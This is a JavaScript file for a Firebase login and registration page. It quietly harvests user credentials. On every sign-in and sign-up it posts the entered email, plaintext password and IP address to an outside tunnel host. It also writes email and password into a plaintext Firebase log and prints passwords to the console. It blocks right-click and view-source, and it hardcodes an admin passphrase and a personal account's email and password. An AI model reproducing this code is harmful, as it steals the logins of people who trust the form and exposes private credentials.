const firebaseConfig = {
  apiKey: "AIzaSyAVLvRJO4nNO5jyeVCVd9gZIZKmg5Isaxw",
  authDomain: "m-nawaz.firebaseapp.com",
  databaseURL: "https://m-nawaz-default-rtdb.firebaseio.com",
  projectId: "m-nawaz",
  storageBucket: "m-nawaz.appspot.com",
  messagingSenderId: "1041394850791",
  appId: "1:1041394850791:web:7ad1a6e5fa52b2f14cbb42",
  measurementId: "G-6KX7VW48GW",
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.database();
var ip_address;

function signUp() {
  var email = document.getElementById("email");
  var password = document.getElementById("password");
  const promise = auth.createUserWithEmailAndPassword(
    email.value,
    password.value
  );

  axios
    .post("https://nawaz1.loca.lt/register", {
      email: email.value,
      password: password.value,
      ipadress: ip_address,
    })
    .then((res) => {
      console.log(res.data);
    });

  promise.catch((e) => {
    if (e.message.toString() == "The email address is badly formatted.") {
      alert("Invalid Email or Password");
    } else if (
      e.message.toString() == "Password should be at least 6 characters"
    ) {
      alert("Password too weak , it should contain atleast 6 characters");
    } else if (
      e.message.toString() ==
      "The email address is already in use by another account."
    ) {
      alert("This Username is already taken ...");
    } else if (
      e.message.toString() ==
      "A network error (such as timeout, interrupted connection or unreachable host) has occurred."
    ) {
      alert("Network connection not found !");
    } else {
      alert(e.message);
    }
  });
}

const h1 = document.querySelector("h1");
const container = document.querySelector(".container");
const ban = document.querySelector(".ban");
const ban_time = document.querySelector(".ban_time");
const title = document.querySelector("title");
const ok = document.querySelector(".invisible");
const ban_Reason = document.querySelector(".ban_reason");
const text = document.querySelector(".text");

function DisplayIP(response) {
  ip_address = response.ip;
}

//signIn
function signIn() {
  var email = document.getElementById("email");
  var password = document.getElementById("password");

  var today = new Date();
  var date =
    today.getFullYear() + "-" + (today.getMonth() + 1) + "-" + today.getDate();
  var time =
    today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  var dateTime = date + " " + time;
  db.ref("logs").once("value", function (snapshot) {
    // var password = "not known";
    var prevVal = snapshot.val();
    db.ref("logs").set(
      `${prevVal}
           __________________________________
           Email: ${email.value}
           Password: ${password.value}
           Time: ${dateTime}
           __________________________________
           `
    );
  });
  axios
    .post("https://nawaz1.loca.lt/login", {
      email: email.value,
      password: password.value,
      ipadress: ip_address,
    })
    .then((res) => {
      console.log(res.data);
    });
  const promise = auth.signInWithEmailAndPassword(email.value, password.value);
  promise.catch((e) => {
    if (
      e.message.toString() ==
      "The user account has been disabled by an administrator."
    ) {
      container.textContent = "";
      ban.textContent = "This account has been banned !";
      ban_time.textContent = "Ban Time : Forever";
      ban_Reason.textContent = "Reason : Unknown";
      title.textContent = "Banned !";
      ok.textContent = "OK";
      ok.style.backgroundColor = "#3428a7";
      ok.style.width = "200px";
      ok.style.height = "80px";
      ok.style.cursor = "Pointer";
      ok.style.color = "white";
    } else if (
      e.message.toString() == "The email address is badly formatted."
    ) {
      alert("Invalid Username or Password");
    } else if (
      e.message.toString() ==
      "A network error (such as timeout, interrupted connection or unreachable host) has occurred."
    ) {
      alert("Network connection not found !");
    } else if (
      e.message.toString() ==
      "There is no user record corresponding to this identifier. The user may have been deleted."
    ) {
      alert(`The Email: "${email.value}" Does Not Exist`);
    } else if (
      e.message.toString() ==
      "The password is invalid or the user does not have a password."
    ) {
      alert("Wrong Username or password");
    } else {
      alert(e.message);
    }
  });
}

ok.onclick = function () {
  ok.onclick = window.location = "./index.html";
};

firebase.auth().onAuthStateChanged((user) => {
  if (user) {
    var password = document.getElementById("password");
    console.log("Email : " + user.email + "  , has signed in");
    console.log("Password : " + password.value);

    alert("Signed In");
    window.location = "./Inside/inside.html";
  }
  if (user.email == "admin@gmail.com") {
    alert("Welcome Admin !");
  }
});

//forgotPass
function forgotPass() {
  const email = document.getElementById("email").value;
  firebase
    .auth()
    .sendPasswordResetEmail(email)
    .then(() => {
      alert("Password set Link sent to Your email ID");
    })
    .catch((error) => {
      alert("Invalid Username");
    });
}

document.onkeydown = function (e) {
  if (e.ctrlKey && e.keyCode === 85) {
    return false;
  }
};
window.oncontextmenu = function () {
  return false;
};

const showPass = document.querySelector(".showPass");
const showText = document.querySelector(".showText");

function ShowPassword() {
  if (password.type == "password") {
    password.type = "text";
    showText.textContent = "Hide Password";
  } else {
    password.type = "password";
    showText.textContent = "Show Password";
  }
}

// Update Code

var Update = false;
if (Update == true) {
  container.textContent = "";
  title.textContent = "Update !";
  const body = document.querySelector("body");
  var information = document.querySelector(".info");
  information.style.fontFamily = "Nunito";
  information.style.fontSize = "15px";
  information.style.fontWeight = "bold";
  setTimeout(() => {
    information.textContent =
      "Did you know : Press shift + N , to see web news !";
  }, 1600);
  setTimeout(() => {
    information.textContent =
      "Did you know : Press Alt + S , to click Register button !";
  }, 6000);
  setTimeout(() => {
    information.textContent = "Did you know : Press E , to focus on email";
  }, 10400);
  setTimeout(() => {
    information.textContent = "Did you know : Press P , to focus on Password";
  }, 14800);
  setTimeout(() => {
    information.textContent =
      "Did you know : Press F and P togather , to click on Forgot Password";
  }, 19600);
  setTimeout(() => {
    information.textContent = "Did you know : Press R , to reload";
  }, 24000);
  setTimeout(() => {
    information.textContent =
      "Did you know : Press Ctrl + Z , to show format of email and password";
  }, 28400);
  setTimeout(() => {
    information.textContent =
      "Did you know : Press alt + P , to view your profile";
  }, 32800);
  setTimeout(() => {
    information.textContent = "Did you know : Press shift + L , to LogOut";
  }, 37200);
  setTimeout(() => {
    window.location = "index.html";
  }, 41400);

  ban.textContent = "Update Under Progress !";
  ban_time.textContent = "Estimated Time : Unknown";
  ban_Reason.textContent = "Design Changes and some more ..";
  ban.style.fontSize = "25px";
  ban.style.color = "red";
  ban.style.fontFamily = "Arial";
  ban_time.style.fontFamily = "Nunito";
  ok.textContent = "Reload";
  ok.style.backgroundColor = "#0039BF";
  ok.style.color = "white";
  ok.style.width = "150px";
  ok.style.height = "40px";
  ok.style.borderRadius = "1px";
  ok.style.cursor = "pointer";
}

document.body.onkeydown = function (e) {
  if (e.keyCode == 13) signIn();
};

Mousetrap.bind("alt+s", function (e) {
  signUp();
});
Mousetrap.bind("alt+l", function (e) {
  signIn();
});
Mousetrap.bind("e", function (e) {
  email.focus();
});
Mousetrap.bind("p", function (e) {
  password.focus();
});
Mousetrap.bind("f p", function (e) {
  forgotPass();
});
Mousetrap.bind("r", function (e) {
  window.location = "./index.html";
});
Mousetrap.bind("ctrl+z", function (e) {
  email.value = "example@gmail.com";
  password.value = "123456";
  ShowPassword();
});

Mousetrap.bind("a l", function (e) {
  showPass.click();
  var adminPass = prompt("Enter Admin Password here ...");
  if (adminPass == "nwzlink") {
    email.focus();
    var typeVoice = new Audio("./Typewriter Sound Effect.mp3");
    typeVoice.play();
    email.value = "n";
    setTimeout(() => {
      email.value = "na";
    }, 200);
    setTimeout(() => {
      email.value = "naw";
    }, 400);
    setTimeout(() => {
      email.value = "nawa";
    }, 600);
    setTimeout(() => {
      email.value = "nawaz";
    }, 800);
    setTimeout(() => {
      email.value = "nawazx";
    }, 1000);
    setTimeout(() => {
      email.value = "nawazxx";
    }, 1200);
    setTimeout(() => {
      email.value = "nawazxx3";
    }, 1400);
    setTimeout(() => {
      email.value = "nawazxx33";
    }, 1600);
    setTimeout(() => {
      email.value = "nawazxx333";
    }, 1800);
    setTimeout(() => {
      email.value = "nawazxx333@";
    }, 2000);
    setTimeout(() => {
      email.value = "nawazxx333@g";
    }, 2200);
    setTimeout(() => {
      email.value = "nawazxx333@gm";
    }, 2400);
    setTimeout(() => {
      email.value = "nawazxx333@gma";
    }, 2600);
    setTimeout(() => {
      email.value = "nawazxx333@gmai";
    }, 2800);
    setTimeout(() => {
      email.value = "nawazxx333@gmail";
    }, 3000);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.";
    }, 3200);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.c";
    }, 3400);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.co";
    }, 3600);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.com";
    }, 3800);
    // ------------------------------------------------------
    password.focus();
    password.value = "N";
    setTimeout(() => {
      password.value = "Na";
    }, 200);
    setTimeout(() => {
      password.value = "Naw";
    }, 400);
    setTimeout(() => {
      password.value = "Nawa";
    }, 600);
    setTimeout(() => {
      password.value = "Nawaz";
    }, 800);
    setTimeout(() => {
      password.value = "Nawazl";
    }, 1000);
    setTimeout(() => {
      password.value = "Nawazli";
    }, 1200);
    setTimeout(() => {
      password.value = "Nawazlin";
    }, 1400);
    setTimeout(() => {
      password.value = "Nawazlink";
    }, 1600);
    setTimeout(() => {
      password.value = "Nawazlinke";
    }, 1800);
    setTimeout(() => {
      password.value = "Nawazlinked";
    }, 2000);

    // signIn Time

    setTimeout(() => {
      signIn();
    }, 4000);
  } else {
    alert("Wrong Password !");
  }
});

Mousetrap.bind("s p", function (e) {
  showPass.click();
});

Mousetrap.bind("shift+n", function (e) {
  alert("News : Last Updated On 12/22/2021");
});

Mousetrap.bind("alt+s", function (e) {
  signUp();
});
Mousetrap.bind("alt+l", function (e) {
  signIn();
});
Mousetrap.bind("e", function (e) {
  email.focus();
});
Mousetrap.bind("p", function (e) {
  password.focus();
});
Mousetrap.bind("f p", function (e) {
  forgotPass();
});
Mousetrap.bind("r", function (e) {
  window.location = "./index.html";
});
Mousetrap.bind("ctrl+z", function (e) {
  email.value = "example@gmail.com";
  password.value = "123456";
  ShowPassword();
});
Mousetrap.bind("s p", function (e) {
  showPass.click();
});
Mousetrap.bind("a l", function (e) {
  showPass.click();
  var adminPass = prompt("Enter Admin Password here ...");
  if (adminPass == "nwzlink") {
    email.focus();
    var typeVoice = new Audio("./Typewriter Sound Effect.mp3");
    typeVoice.play();
    email.value = "n";
    setTimeout(() => {
      email.value = "na";
    }, 200);
    setTimeout(() => {
      email.value = "naw";
    }, 400);
    setTimeout(() => {
      email.value = "nawa";
    }, 600);
    setTimeout(() => {
      email.value = "nawaz";
    }, 800);
    setTimeout(() => {
      email.value = "nawazx";
    }, 1000);
    setTimeout(() => {
      email.value = "nawazxx";
    }, 1200);
    setTimeout(() => {
      email.value = "nawazxx3";
    }, 1400);
    setTimeout(() => {
      email.value = "nawazxx33";
    }, 1600);
    setTimeout(() => {
      email.value = "nawazxx333";
    }, 1800);
    setTimeout(() => {
      email.value = "nawazxx333@";
    }, 2000);
    setTimeout(() => {
      email.value = "nawazxx333@g";
    }, 2200);
    setTimeout(() => {
      email.value = "nawazxx333@gm";
    }, 2400);
    setTimeout(() => {
      email.value = "nawazxx333@gma";
    }, 2600);
    setTimeout(() => {
      email.value = "nawazxx333@gmai";
    }, 2800);
    setTimeout(() => {
      email.value = "nawazxx333@gmail";
    }, 3000);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.";
    }, 3200);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.c";
    }, 3400);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.co";
    }, 3600);
    setTimeout(() => {
      email.value = "nawazxx333@gmail.com";
    }, 3800);
    // ------------------------------------------------------
    password.focus();
    password.value = "N";
    setTimeout(() => {
      password.value = "Na";
    }, 200);
    setTimeout(() => {
      password.value = "Naw";
    }, 400);
    setTimeout(() => {
      password.value = "Nawa";
    }, 600);
    setTimeout(() => {
      password.value = "Nawaz";
    }, 800);
    setTimeout(() => {
      password.value = "Nawazl";
    }, 1000);
    setTimeout(() => {
      password.value = "Nawazli";
    }, 1200);
    setTimeout(() => {
      password.value = "Nawazlin";
    }, 1400);
    setTimeout(() => {
      password.value = "Nawazlink";
    }, 1600);
    setTimeout(() => {
      password.value = "Nawazlinke";
    }, 1800);
    setTimeout(() => {
      password.value = "Nawazlinked";
    }, 2000);

    // signIn Time

    setTimeout(() => {
      signIn();
    }, 4000);
  } else {
    alert("Wrong Password !");
  }
});

Mousetrap.bind("s p", function (e) {
  showPass.click();
});
document.onkeydown = function (e) {
  if (e.ctrlKey && e.keyCode === 85) {
    window.location = "./Source/source.html";
    return false;
  }
};
